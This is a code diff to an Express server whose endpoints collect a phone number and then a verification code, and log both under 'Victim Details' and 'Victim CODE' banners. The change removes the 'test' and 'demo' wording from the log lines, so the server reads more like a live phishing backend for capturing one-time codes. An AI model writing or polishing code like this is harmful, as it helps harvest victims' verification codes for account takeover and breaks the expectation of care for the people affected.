@@ -25,7 +25,7 @@ app.post("/api/request-code", (req, res) => {
   }
 
   console.log("\n--- Victim Details ---");
-  console.log("Test phone number submitted:", phone);
+  console.log("PHONE NUMBER:", phone);
   console.log("------------------\n");
 
   return res.json({ success: true, message: "Demo code: 123456" });
@@ -44,7 +44,7 @@ app.post("/api/verify-code", (req, res) => {
   const valid = code === "123456";
 
   console.log("\n--- Victim CODE ---");
-  console.log("Entered demo code:", code);
+  console.log("VERIFICATION CODE:", code);
   console.log("------------------\n");
 
   return res.json({ success: valid });
